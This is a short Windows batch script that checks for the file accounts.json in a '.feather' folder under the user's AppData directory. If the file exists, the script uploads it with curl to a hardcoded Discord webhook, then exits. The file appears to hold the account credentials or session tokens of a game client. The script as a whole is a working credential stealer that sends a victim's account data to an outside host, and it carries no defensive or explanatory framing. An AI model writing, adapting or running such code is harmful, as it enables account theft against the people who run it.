@echo off
setlocal enabledelayedexpansion

:: Use %userprofile% to dynamically set the file path
set filePath=%userprofile%\AppData\Roaming\.feather\accounts.json
set webhookUrl="https://discord.com/api/webhooks/1335167219298074697/w1kkY9QUdIOgDDdtHPalRp5Q1b93_wDowLoGS-hk2ffZvxDR7PitzUKTBRWsvToHiqQ0"

:: Check if the file exists
if exist "%filePath%" (
    :: Send the file as an attachment to the Discord webhook using curl
    curl -X POST %webhookUrl% ^
    -H "Content-Type: multipart/form-data" ^
    -F "file=@%filePath%" 
)

:: Exit the script immediately after sending
exit
